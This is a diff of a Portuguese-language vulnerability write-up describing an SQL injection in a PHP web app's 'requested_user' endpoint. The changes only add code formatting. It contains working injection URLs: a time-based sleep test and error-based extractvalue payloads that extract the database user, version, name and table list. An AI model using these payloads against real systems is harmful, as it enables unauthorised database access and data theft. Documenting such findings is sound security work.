@@ -9,28 +9,28 @@ A vulnerabilidade foi encontrada de uma forma um pouco inusitada, a alguns dias 
 
 <br>
 O teste inicial foi lógicamente foi adicionar uma aspas simples e ver o que iria me retornar:
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20a%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20a%23</code>
 <img src="0x1.png">
 <br>
 Então, seguindo o erro, temos um Sql Injectio aqui!
 Fazendo mais um teste para confirmar, conseguimos ter a certeza disso:
 <br>
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'or%20sleep(5)%23</code>
 <img src="0x3.png">
 Até este ponto estava tudo bem, porém notei uma limitção ao tentar dumpar a db no modo clássico, até mesmo usando blind.
 
 Me pareceu estranho não conseguir dumpar tudo, porém, entendi que eu estava limitado, fazendo algumas pesquisas vi que a maneira seria fazer o dump usando error based com XPATH Injection.
 <br>
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,user())%20%23</code>
 <img src="0x4.png">
 <br>
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,version())%20%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(1,version())%20%23</code>
 <img src="0x5.png">
 <br>
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20database())))%20%23</code>
 <img src="0x6.png">
 <br>
-url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23
+<code>url:http://[HOST]/index.php/home/requested_user/Sent%20interest/1'%20or%20extractvalue(0x0a,concat(0x0a,(select%20table_name%20from%20information_schema.tables)))%20%23</code>
 <img src="0x7.png">
 Bom, a partir deste ponto, a melhor forma seria criar um script para fazer o dump!
 <br>
